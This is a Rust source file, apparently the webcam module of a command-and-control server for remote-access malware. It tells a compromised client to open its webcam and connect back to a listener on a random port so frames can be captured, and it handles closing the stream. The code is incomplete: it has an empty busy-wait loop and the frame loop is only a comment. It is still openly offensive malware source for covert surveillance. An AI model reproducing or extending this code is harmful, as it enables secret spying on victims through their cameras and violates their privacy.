use crate::{c2_state::C2State, constants::{DIM, GREEN, RED, RESET, WHITE, YELLOW, CYAN}};
use shared::{ClientMessage, InstructMessage, utils::{read_message, send_message}};
use std::{net::{TcpListener, TcpStream}, sync::{Arc, atomic::{AtomicBool, Ordering}}, thread};
use rand::Rng;

pub fn run(conn: &mut TcpStream, instruct: &[&str], state: &C2State) -> Result<bool, String> {
    let close: bool = match instruct.get(1) {
        Some(s) if s == &"close" => true,
        None => false,
        _ => false
    };

    if close {
        close_webcam(conn, state);
        return Ok(true);
    }

    state.webcam_running.store(true, Ordering::SeqCst);
    let running = Arc::clone(&state.webcam_running);

    // Open webcam
    let conn_clone = match conn.try_clone() {
        Ok(c) => c,
        Err(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:webcam{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Ok(true);
        }
    };

    let handle = thread::spawn(move || {
        let mut conn_clone = conn_clone;
        open_webcam(&mut conn_clone, running);
    });
    *state.webcam_handle.lock().unwrap() = Some(handle);

    Ok(true)
}


pub fn close_webcam(conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
    // stop loop in thread
    state.webcam_running.store(false, Ordering::SeqCst);

    // close message to client
    match send_message(conn, &InstructMessage::CloseWebCam) {
        Ok(_) => (),
        Err(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:webcam{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Ok(true);
        }
    };

    // wait till thread finsh (optional)
    if let Some(handle) = state.webcam_handle.lock().unwrap().take() {
        let _ = handle.join();
    }

    Ok(true)
}

pub fn open_webcam(conn: &mut TcpStream, running: Arc<AtomicBool>) {
    // Create new socket in a random port
    let port = rand::thread_rng().gen_range(30000..65535);
    let listener = TcpListener::bind(format!("127.0.0.1:{port}")).expect("the port can not be opened...");

    // Send action to connect to the new socket
    match send_message(conn, &InstructMessage::WebCam(port)) {
        Ok(_) => (),
        Err(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:webcam{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return;
        }
    };

    // Start listining
    println!("\n\t{DIM}[{RESET}{WHITE}webcam:listening:{RESET}{DIM}]{RESET} {CYAN}port {port}{RESET}\n");
    let (mut webcam_conn, _addr) = match listener.accept() {
        Ok(c) => c,
        Err(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:webcam_thread{RESET}{DIM}]{RESET} {YELLOW}Error accepting connection: {}{RESET}\n", e);
            return;
        }
    };    

    while running.load(Ordering::SeqCst){

    }

    // here we make a loop for frames
    let msg: ClientMessage = match read_message(&mut webcam_conn)  {
        Ok(msg) => msg,
        Err(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:webcam{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return;
        }
    };
    match msg {
        ClientMessage::Error(err ) => {
            println!("\n\t{DIM}[{RESET}{RED}err:webcam{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", err);
            return;
        },
        _ => {
            println!("\n\t{DIM}[{RESET}{GREEN}shell{RESET}{DIM}]{RESET} {WHITE}WebCam Opened on client-side{RESET}\n");
        }
    };
}